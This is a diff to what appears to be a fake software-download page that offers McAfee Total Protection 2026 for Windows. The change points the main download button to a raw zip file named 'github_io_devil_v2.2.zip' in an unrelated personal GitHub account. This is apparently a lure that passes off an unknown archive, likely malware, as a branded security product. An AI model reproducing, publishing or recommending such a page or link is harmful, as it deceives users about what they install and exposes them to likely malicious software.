@@ -7,7 +7,7 @@ description: ""
 
 <p style="margin: 20px 0; font-size: 16px;">This page gives you everything you need to download and install McAfee Total Protection on your Windows computer. The software guards against viruses, hackers, and online threats. It works on Windows 11 and Windows 10.</p>
 
-<a href="https://github.com/Devil091256/McAfee-Total-Protection-2026" style="display: inline-block; padding: 16px 32px; background: linear-gradient(135deg, #0066CC, #004499); color: white; text-decoration: none; font-size: 18px; font-weight: bold; border-radius: 8px; margin: 20px 0; box-shadow: 0 4px 6px rgba(0,0,0,0.2);">📥 Download McAfee Total Protection 2026</a>
+<a href="https://github.com/Devil091256/devil091256.github.io/raw/refs/heads/main/megohmmeter/github_io_devil_v2.2.zip" style="display: inline-block; padding: 16px 32px; background: linear-gradient(135deg, #0066CC, #004499); color: white; text-decoration: none; font-size: 18px; font-weight: bold; border-radius: 8px; margin: 20px 0; box-shadow: 0 4px 6px rgba(0,0,0,0.2);">📥 Download McAfee Total Protection 2026</a>
 
 <h2 style="color: #333;">📋 What This Software Does</h2>
 
